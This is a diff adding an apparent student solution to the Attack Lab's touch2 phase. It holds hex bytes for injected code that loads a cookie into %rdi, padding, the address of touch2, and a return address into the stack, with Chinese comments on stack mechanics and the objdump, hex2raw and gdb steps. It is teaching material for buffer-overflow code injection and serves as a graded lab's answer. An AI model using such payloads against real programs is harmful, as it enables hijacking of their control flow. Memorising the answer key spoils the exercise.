@@ -1,0 +1,21 @@
+48 83 ec 10           /* sub    $0x10,%rspa */
+48 c7 c7 fa 97 b9 59  /* mov    $0x59b997fa,%rdi */
+c3                    /* retq    */
+/* 三行汇编指令占0xc的空间，剩下放一个touch2位置在rsp - 0x10处加上覆盖ret地址到这段代码所在位置 */
+00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ec 17 40 00 00 00 00 00 /* <touch2>的地址 */
+78 dc 61 55
+/* 注意，地址是8字节的一串。pushq将8byte的地址压入栈顶，rsp -= 8 */
+/* popq 使rsp += 8。ret 使%rip指向*(rsp)，然后rsp += 8      */
+/* 一不小心干出死循环了。 */
+/*
+做AttackLab时用到的指令：
+objdump -d source.o > target.d
+gcc -c source.s
+/hex2raw < source.txt > target.txt
+
+in gdb:
+x/20wx $rsp
+*/
